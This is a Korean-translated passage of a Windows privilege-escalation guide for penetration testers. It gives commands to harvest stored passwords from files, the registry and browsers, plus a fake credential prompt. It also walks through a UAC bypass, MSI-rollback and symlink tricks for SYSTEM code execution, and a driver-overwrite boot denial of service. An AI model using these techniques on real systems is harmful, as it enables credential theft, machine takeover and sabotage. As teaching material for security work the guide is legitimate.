언제든지 **사용자에게 그의 자격 증명을 입력하라고 요청할 수 있고, 심지어 다른 사용자의 자격 증명도** 사용자가 알고 있을 것이라고 생각되면 요청할 수 있습니다(참고로 클라이언트에게 직접 **자격 증명**을 **요청**하는 것은 정말 **위험**합니다):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **자격 증명을 포함할 수 있는 가능한 파일 이름**

예전에 **clear-text** 또는 **Base64** 형식의 **passwords**를 포함하던 것으로 알려진 파일들
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
모든 제안된 파일을 검색하세요:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin의 Credentials

Bin도 확인해서 그 안에 credentials가 있는지 살펴봐야 합니다

여러 프로그램에 저장된 **passwords**를 **recover**하려면 다음을 사용할 수 있습니다: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry 내부

**credentials가 있을 수 있는 다른 registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**openssh keys를 registry에서 추출합니다.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

**Chrome or Firefox**에 저장된 password가 있는 db를 확인해야 합니다.\
또한 브라우저의 history, bookmarks, favourites도 확인해서, 거기에 **passwords are** 저장되어 있을 수도 있습니다.

브라우저에서 password를 추출하는 Tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**은 Windows 운영체제에 내장된 technology로, 서로 다른 언어의 software components 간 **intercommunication**을 가능하게 합니다. 각 COM component는 **class ID (CLSID)**로 **identified via** 되며, 각 component는 하나 이상의 interfaces를 통해 functionality를 노출하고, 이들은 interface IDs (IIDs)로 identified 됩니다.

COM classes와 interfaces는 registry의 **HKEY\CLASSES\ROOT\CLSID**와 **HKEY\CLASSES\ROOT\Interface** 아래에 각각 정의됩니다. 이 registry는 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

이 registry의 CLSIDs 안에서는 child registry **InProcServer32**를 찾을 수 있으며, 여기에는 **DLL**을 가리키는 **default value**와 **ThreadingModel**이라는 값이 있습니다. 이 값은 **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi), 또는 **Neutral** (Thread Neutral)일 수 있습니다.

![](<../../images/image (729).png>)

기본적으로, 실행될 **DLLs** 중 하나라도 **overwrite**할 수 있다면, 그 DLL이 다른 사용자에 의해 실행될 경우 **escalate privileges**할 수 있습니다.

공격자가 persistence mechanism으로 COM Hijacking을 어떻게 사용하는지 알아보려면 다음을 확인하세요:


{{#ref}}
com-hijacking.md
{{endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**특정 파일 이름의 파일 검색**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**레지스트리에서 키 이름과 비밀번호를 검색하기**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 비밀번호를 검색하는 도구들

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** 플러그인으로, 이 플러그인은 **피해자 내부에서 자격 증명을 검색하는 모든 metasploit POST 모듈을 자동으로 실행**하도록 만들었다.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 는 이 페이지에 언급된 비밀번호가 포함된 모든 파일을 자동으로 검색한다.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 는 시스템에서 비밀번호를 추출하는 또 다른 훌륭한 도구다.

도구 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 는 여러 도구가 평문으로 저장하는 **sessions**, **usernames**, **passwords**를 검색한다 (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM**으로 실행 중인 **process가 새 process를 열고** (`OpenProcess()`) **full access**를 가진다고 가정해보자. 같은 process가 **또한 새 process를 생성하는데** (`CreateProcess()`) **low privileges**로 실행되지만 main process의 열린 handle들을 모두 상속한다.\
그렇다면 **low privileged process에 대한 full access**를 가지고 있다면, `OpenProcess()`로 생성된 **privileged process에 대한 열린 handle**을 가져와 `shellcode`를 **inject**할 수 있다.\
이 취약점을 **어떻게 탐지하고 exploit하는지**에 대한 더 많은 정보는 [이 예제를 읽어라.](leaked-handle-exploitation.md)\
다양한 권한 수준으로 상속된 process와 thread의 더 많은 open handlers를 어떻게 테스트하고 abuse하는지에 대한 더 완전한 설명은 [**이 다른 글을 읽어라**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/) (**full access만이 아님**).

## Named Pipe Client Impersonation

**pipes**라고 불리는 공유 메모리 세그먼트는 process communication과 data transfer를 가능하게 한다.

Windows는 **Named Pipes**라는 기능을 제공하여, 서로 관련 없는 process들도 서로 다른 네트워크를 통해서도 데이터를 공유할 수 있게 한다. 이는 **named pipe server**와 **named pipe client**로 역할이 정의된 client/server architecture와 비슷하다.

**client**가 pipe를 통해 데이터를 보내면, pipe를 설정한 **server**는 필요한 **SeImpersonate** 권한이 있다면 **client의 identity를 takeover**할 수 있다. 네가 흉내 낼 수 있는 pipe를 통해 통신하는 **privileged process**를 식별하면, 네가 만든 pipe와 상호작용할 때 그 process의 identity를 채택하여 **더 높은 권한을 얻을 기회**가 생긴다. 이런 attack을 실행하는 방법은 [**여기**](named-pipe-client-impersonation.md)와 [**여기**](#from-high-integrity-to-system)에서 유용한 가이드를 찾을 수 있다.

또한 다음 tool은 **burp 같은 tool로 named pipe communication을 intercept**할 수 있게 해준다: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **그리고 이 tool은 모든 pipe를 나열하고 확인해서 privescs를 찾을 수 있게 해준다** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

서버 모드의 Telephony service (TapiSrv)는 `\\pipe\\tapsrv` (MS-TRP)를 노출한다. 원격 인증된 client는 mailslot-based async event path를 abuse해서 `ClientAttach`를 `NETWORK SERVICE`가 쓸 수 있는 기존 파일에 대한 임의의 **4-byte write**로 바꿀 수 있고, 그 다음 Telephony admin rights를 얻어 서비스로서 임의의 DLL을 load할 수 있다. 전체 흐름:

- `pszDomainUser`를 writable existing path로 설정한 `ClientAttach` → 서비스가 `CreateFileW(..., OPEN_EXISTING)`으로 이를 열고 async event writes에 사용한다.
- 각 event는 `Initialize`의 attacker-controlled `InitContext`를 그 handle에 write한다. `LRegisterRequestRecipient`(`Req_Func 61`)으로 line app을 등록하고, `TRequestMakeCall`(`Req_Func 121`)을 트리거한 뒤, `GetAsyncEvents`(`Req_Func 0`)로 가져오고, 그 다음 unregister/shutdown 해서 deterministic writes를 반복한다.
- `C:\Windows\TAPI\tsec.ini`의 `[TapiAdministrators]`에 자신을 추가한 뒤 재연결하고, 임의의 DLL path로 `GetUIDllName`을 호출하여 `TSPI_providerUIIdentify`를 `NETWORK SERVICE`로 실행한다.

더 자세한 내용:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows에서 stuff를 실행할 수 있는 File Extensions

페이지 **[https://filesec.io/](https://filesec.io/)**를 확인하라

### Protocol handler / ShellExecute abuse via Markdown renderers

`ShellExecuteExW`로 전달되는 클릭 가능한 Markdown links는 위험한 URI handlers(`file:`, `ms-appinstaller:` 또는 등록된 scheme)를 트리거하고 attacker-controlled files를 current user로 실행할 수 있다. 자세한 내용은 다음을 보라:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

user로 shell을 얻었을 때, command line에 **credentials를 전달하는** scheduled tasks나 다른 process들이 실행 중일 수 있다. 아래 script는 2초마다 process command line을 캡처하고 현재 상태를 이전 상태와 비교하여 차이점을 출력한다.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## 프로세스에서 비밀번호 탈취

## Low Priv User에서 NT\AUTHORITY SYSTEM으로 (CVE-2019-1388) / UAC Bypass

그래픽 인터페이스(console 또는 RDP)를 사용할 수 있고 UAC가 활성화되어 있다면, 일부 Microsoft Windows 버전에서는 권한이 없는 사용자로부터 terminal이나 "NT\AUTHORITY SYSTEM"과 같은 다른 process를 실행할 수 있습니다.

이로 인해 같은 취약점을 사용해 privilege escalation과 UAC bypass를 동시에 수행할 수 있습니다. 또한 아무것도 설치할 필요가 없고, 이 과정에서 사용되는 binary는 Microsoft가 서명하고 배포한 것입니다.

영향을 받는 시스템 중 일부는 다음과 같습니다:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
이 취약점을 exploit하려면, 다음 단계를 수행해야 합니다:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium에서 High Integrity Level / UAC Bypass로

**Integrity Levels**에 대해 배우려면 이것을 읽으세요:


{{#ref}}
integrity-levels.md
{{#endref}}

그다음 **UAC와 UAC bypasses**에 대해 배우려면 이것을 읽으세요:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename에서 SYSTEM EoP로

이 기법은 [**이 블로그 पोस्ट**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)와 [**여기에서 제공되는**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) exploit code에 설명되어 있습니다.

이 공격은 기본적으로 Windows Installer의 rollback 기능을 악용해서 uninstallation 과정 중에 정상 파일을 악성 파일로 교체하는 것입니다. 이를 위해 attacker는 `C:\Config.Msi` 폴더를 하이재킹하는 데 사용할 **malicious MSI installer**를 만들어야 하며, 이후 Windows Installer가 다른 MSI package의 uninstallation 중 rollback 파일을 저장할 때 이 폴더를 사용하게 됩니다. 이때 rollback 파일은 malicious payload를 담도록 수정됩니다.

요약된 기법은 다음과 같습니다:

1. **Stage 1 – 하이재킹 준비 (`C:\Config.Msi`를 비워두기)**

- Step 1: MSI 설치
- 쓰기 가능한 폴더 (`TARGETDIR`)에 무해한 파일(예: `dummy.txt`)을 설치하는 `.msi`를 만듭니다.
- 설치 프로그램을 **"UAC Compliant"**로 표시해서 **non-admin user**도 실행할 수 있게 합니다.
- 설치 후 파일에 대한 **handle**을 열어 둡니다.

- Step 2: Uninstall 시작
- 같은 `.msi`를 uninstall합니다.
- uninstall 과정은 파일을 `C:\Config.Msi`로 옮기고 `.rbf` 파일(rollback backup)로 이름을 바꾸기 시작합니다.
- `GetFinalPathNameByHandle`을 사용해 열린 파일 handle을 **poll**하여 파일이 `C:\Config.Msi\<random>.rbf`가 되는 시점을 감지합니다.

- Step 3: Custom Syncing
- `.msi`에는 **custom uninstall action (`SyncOnRbfWritten`)**이 포함되어 있습니다.
- 이 액션은 `.rbf`가 작성되었을 때 신호를 보냅니다.
- 그리고 uninstall을 계속하기 전에 다른 event를 **wait**합니다.

- Step 4: `.rbf` 삭제 차단
- 신호를 받으면, `FILE_SHARE_DELETE` 없이 `.rbf` 파일을 **open**합니다. 이렇게 하면 **삭제되지 못하게 막을 수 있습니다**.
- 그런 다음 uninstall이 끝날 수 있도록 다시 신호를 보냅니다.
- Windows Installer는 `.rbf`를 삭제하지 못하고, 모든 내용을 삭제할 수 없기 때문에 **`C:\Config.Msi`가 제거되지 않습니다**.

- Step 5: `.rbf` 수동 삭제
- attacker인 당신이 `.rbf` 파일을 수동으로 삭제합니다.
- 이제 **`C:\Config.Msi`가 비어 있고**, hijack할 준비가 되었습니다.

> 이 시점에서 **SYSTEM-level arbitrary folder delete vulnerability**를 트리거해 `C:\Config.Msi`를 삭제합니다.

2. **Stage 2 – rollback scripts를 악성 파일로 교체**

- Step 6: 약한 ACL로 `C:\Config.Msi` 다시 만들기
- 직접 `C:\Config.Msi` 폴더를 다시 만듭니다.
- **weak DACLs**(예: Everyone:F)를 설정하고, `WRITE_DAC`가 있는 상태로 **handle을 열어 둡니다**.

- Step 7: 다른 Install 실행
- 다시 `.msi`를 설치합니다. 다음을 지정합니다:
- `TARGETDIR`: 쓰기 가능한 위치.
- `ERROROUT`: 강제 실패를 유발하는 변수.
- 이 설치는 rollback을 다시 트리거하는 데 사용되며, `.rbs`와 `.rbf`를 읽게 됩니다.

- Step 8: `.rbs` 감시
- `ReadDirectoryChangesW`를 사용해 `C:\Config.Msi`를 모니터링하다가 새 `.rbs`가 나타날 때까지 기다립니다.
- 파일명을 캡처합니다.

- Step 9: Rollback 전에 Sync
- `.msi`에는 **custom install action (`SyncBeforeRollback`)**이 포함되어 있습니다.
- 이 액션은 `.rbs`가 생성되면 event를 신호로 보냅니다.
- 그리고 계속하기 전에 **wait**합니다.

- Step 10: Weak ACL 다시 적용
- `.rbs created` event를 받은 뒤:
- Windows Installer가 `C:\Config.Msi`에 **strong ACLs**를 다시 적용합니다.
- 하지만 여전히 `WRITE_DAC`가 있는 handle을 가지고 있으므로, **weak ACLs를 다시 적용**할 수 있습니다.

> ACLs는 **handle open 시에만 적용**되므로, 여전히 폴더에 쓸 수 있습니다.

- Step 11: 가짜 `.rbs`와 `.rbf` 넣기
- `.rbs` 파일을 덮어써서 Windows에 다음을 지시하는 **fake rollback script**를 넣습니다:
- 당신의 `.rbf` 파일(malicious DLL)을 **privileged location**(예: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)으로 복원합니다.
- **malicious SYSTEM-level payload DLL**을 담은 가짜 `.rbf`를 넣습니다.

- Step 12: Rollback 트리거
- sync event를 신호로 보내 installer가 다시 진행하게 합니다.
- **type 19 custom action (`ErrorOut`)**이 알려진 지점에서 설치를 **의도적으로 실패**하도록 설정되어 있습니다.
- 이로 인해 **rollback이 시작**됩니다.

- Step 13: SYSTEM이 DLL 설치
- Windows Installer는:
- 당신의 malicious `.rbs`를 읽습니다.
- 당신의 `.rbf` DLL을 target location으로 복사합니다.
- 이제 **SYSTEM-loaded path**에 당신의 **malicious DLL**이 생깁니다.

- 최종 단계: SYSTEM Code 실행
- hijack한 DLL을 로드하는 신뢰된 **auto-elevated binary**(예: `osk.exe`)를 실행합니다.
- **Boom**: 코드가 **SYSTEM**으로 실행됩니다.


### Arbitrary File Delete/Move/Rename에서 SYSTEM EoP로

주요 MSI rollback 기법(위의 것)은 전체 폴더(예: `C:\Config.Msi`)를 삭제할 수 있다고 가정합니다. 그런데 vulnerability가 **arbitrary file deletion**만 허용한다면 어떨까요?

**NTFS internals**를 악용할 수 있습니다: 모든 폴더에는 다음과 같은 숨겨진 alternate data stream이 있습니다:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
이 스트림은 폴더의 **index metadata**를 저장합니다.

따라서 폴더의 **`::$INDEX_ALLOCATION` stream**을 **delete**하면, NTFS는 filesystem에서 해당 **폴더 전체를 제거**합니다.

다음과 같은 표준 file deletion API를 사용해 이를 수행할 수 있습니다:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> 파일 삭제 API를 호출하더라도, **실제로는 폴더 자체를 삭제**합니다.

### Folder Contents Delete에서 SYSTEM EoP로
만약 당신의 primitive가 임의의 파일/폴더를 삭제할 수는 없지만, **공격자가 제어하는 폴더의 *contents*는 삭제할 수 있다면**?

1. Step 1: bait folder와 file 설정
- Create: `C:\temp\folder1`
- 그 안에: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt`에 **oplock** 설정
- privileged process가 `file1.txt`를 삭제하려고 하면, oplock이 **execution을 일시 중지**합니다.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process 트리거 (예: `SilentCleanup`)
- 이 프로세스는 폴더들(예: `%TEMP%`)을 스캔하고 그 안의 내용을 삭제하려고 합니다.
- `file1.txt`에 도달하면, **oplock triggers**가 발생하고 제어가 당신의 callback으로 넘어갑니다.

4. Step 4: oplock callback 안에서 – deletion 리다이렉트

- Option A: `file1.txt`를 다른 곳으로 이동
- 이렇게 하면 oplock을 깨지 않고 `folder1`이 비게 됩니다.
- `file1.txt`를 직접 delete하지 마세요 — 그러면 oplock이 너무 일찍 해제됩니다.

- Option B: `folder1`을 **junction**으로 변환:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: `\RPC Control`에 **symlink**를 생성:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> This targets the NTFS internal stream that stores folder metadata — deleting it deletes the folder.

5. Step 5: Release the oplock
- SYSTEM process continues and tries to delete `file1.txt`.
- But now, due to the junction + symlink, it's actually deleting:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**결과**: `C:\Config.Msi`가 SYSTEM에 의해 삭제됩니다.

### Arbitrary Folder Create에서 Permanent DoS로

**SYSTEM/admin으로 임의의 폴더를 생성**할 수 있게 해주는 primitive를 이용합니다 — **파일을 쓸 수 없거나** **약한 권한을 설정할 수 없어도** 가능합니다.

**중요한 Windows driver**의 이름을 가진 **폴더**를 생성합니다(파일이 아니라), 예:
```
C:\Windows\System32\cng.sys
```
- 이 경로는 보통 `cng.sys` kernel-mode driver에 해당합니다.
- 이를 **폴더로 미리 생성**하면, Windows는 부팅 시 실제 driver를 로드하지 못합니다.
- 그러면 Windows는 부팅 중 `cng.sys`를 로드하려고 시도합니다.
- 폴더를 발견하고, **실제 driver를 해석하는 데 실패**하며, **crash하거나 boot를 중단**합니다.
- **fallback은 없고**, 외부 개입(예: boot repair 또는 disk access) 없이는 **복구도 불가능**합니다.

### privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

**privileged service**가 **writable config**에서 읽은 경로로 logs/exports를 쓸 때, **Object Manager symlinks + NTFS mount points**로 그 경로를 redirect하여 privileged write를 arbitrary overwrite로 바꿀 수 있습니다(심지어 **SeCreateSymbolicLinkPrivilege** 없이도).

**Requirements**
- target path를 저장하는 config가 attacker가 쓸 수 있어야 함(예: `%ProgramData%\...\.ini`).
- `\RPC Control`에 mount point와 OM file symlink를 생성할 수 있어야 함(James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- 그 경로에 write하는 privileged operation이 있어야 함(log, export, report).

**Example chain**
1. config를 읽어 privileged log destination을 복구합니다. 예: `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. admin 없이 path를 redirect합니다:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 권한이 있는 구성 요소가 로그를 쓰도록 기다린다(예: admin이 "send test SMS"를 트리거). 이제 쓰기는 `C:\Windows\System32\cng.sys`에 기록된다.
4. 덮어쓴 대상(hex/PE parser)을 검사해 손상을 확인한다; 재부팅하면 Windows가 변조된 driver path를 로드하도록 강제된다 → **boot loop DoS**. 이는 write를 위해 privileged service가 열게 되는 모든 protected file에도 일반화된다.

> `cng.sys`는 일반적으로 `C:\Windows\System32\drivers\cng.sys`에서 로드되지만, `C:\Windows\System32\cng.sys`에 copy가 존재하면 먼저 시도될 수 있어, 손상된 데이터에 대한 reliable DoS sink가 된다.



## **High Integrity에서 System으로**

### **새 service**

이미 High Integrity process에서 실행 중이라면, **SYSTEM으로 가는 경로**는 **새 service를 만들고 실행하는 것**만으로도 쉬울 수 있다:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> 서비스 바이너리를 만들 때는 그것이 유효한 서비스인지, 또는 바이너리가 필요한 동작을 충분히 빠르게 수행하는지 확인하세요. 그렇지 않으면 20s 후에 종료됩니다.

### AlwaysInstallElevated

High Integrity 프로세스에서는 **AlwaysInstallElevated registry entries를 enable**하고 _**.msi**_ wrapper를 사용해 reverse shell을 **install**해 볼 수 있습니다.\
[관련된 registry keys와 _.msi_ package를 설치하는 방법에 대한 자세한 정보는 여기에서 확인하세요.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**코드는 여기에서** [**찾을 수 있습니다**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

이 token privileges가 있다면(아마 이미 High Integrity process에서 찾게 될 것입니다), SeDebug privilege로 **거의 모든 process**(protected process는 제외)를 **open**할 수 있고, 해당 process의 **token을 copy**한 뒤, 그 token으로 **arbitrary process**를 만들 수 있습니다.\
이 technique에서는 보통 **모든 token privileges를 가진 SYSTEM으로 실행 중인 process를 선택**합니다. (_yes, 모든 token privileges가 없는 SYSTEM processes도 찾을 수 있습니다_)\
**이 technique를 수행하는 code 예시는** [**여기에서 찾을 수 있습니다**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

이 technique는 meterpreter가 `getsystem`에서 권한 상승을 할 때 사용합니다. 이 technique는 **pipe를 만들고, 그 pipe에 쓰기 위해 service를 만들거나 악용하는 것**으로 구성됩니다. 그러면 **`SeImpersonate`** privilege를 사용해 pipe를 만든 **server**가 pipe client(service)의 **token을 impersonate**할 수 있게 되어 SYSTEM privileges를 얻게 됩니다.\
name pipes에 대해 [**더 배우고 싶다면 이 글을 읽어보세요**](#named-pipe-client-impersonation).\
high integrity에서 System으로 name pipes를 사용해 가는 예시를 [**읽고 싶다면 이 글을 읽어보세요**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM**으로 실행 중인 **process**가 **load**하는 dll을 **hijack**할 수 있다면, 해당 권한으로 arbitrary code를 실행할 수 있습니다. 따라서 Dll Hijacking은 이런 종류의 privilege escalation에도 유용하며, 게다가 **high integrity process에서 훨씬 더 쉽게 달성**할 수 있는데, 이는 dll을 load하는 데 사용되는 폴더들에 대해 **write permissions**를 가지기 때문입니다.\
**Dll hijacking에 대해 더 알아보려면 여기에서** [**확인할 수 있습니다**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors를 찾는 데 가장 좋은 tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations와 sensitive files를 확인합니다 (**[**여기에서 확인**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 일부 가능한 misconfigurations를 확인하고 정보를 수집합니다 (**[**여기에서 확인**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations를 확인합니다**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, RDP 저장 세션 정보를 추출합니다. local에서 -Thorough를 사용하세요.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager에서 crendentials를 추출합니다. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 수집한 passwords를 domain 전체에 spray합니다**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh는 PowerShell ADIDNS/LLMNR/mDNS spoofer 및 man-in-the-middle tool입니다.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 기본 privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 알려진 privesc vulnerabilities를 검색합니다 (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights 필요)**

**Exe**

